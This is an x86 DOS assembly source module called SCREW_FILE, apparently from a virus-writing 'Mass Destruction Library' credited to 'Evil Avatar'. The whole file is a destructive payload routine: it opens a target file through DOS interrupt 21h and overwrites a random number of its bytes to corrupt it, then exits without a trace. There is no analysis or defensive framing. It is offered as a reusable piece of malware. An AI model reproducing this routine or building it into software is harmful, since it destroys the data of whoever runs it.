

;SCREW_FILE - module for Mass Destruction Library
;written by Evil Avatar
.model tiny
.code
public screw_file
extrn rnd_num: near

screw_file:
        push cx
        push bx
        push ax               ;save regs that will be changed
        mov ax, 3d01h
        int 21h               ;open the file
        xchg ax, bx
        call rnd_num          
        xchg ax, cx
        mov ah, 40h
        int 21h               ;overwrite a random number of bytes
        mov ah, 3eh
        int 21h               ;close file
        pop ax
        pop bx
        pop cx
        ret                   ;restore regs and return
end screw_file

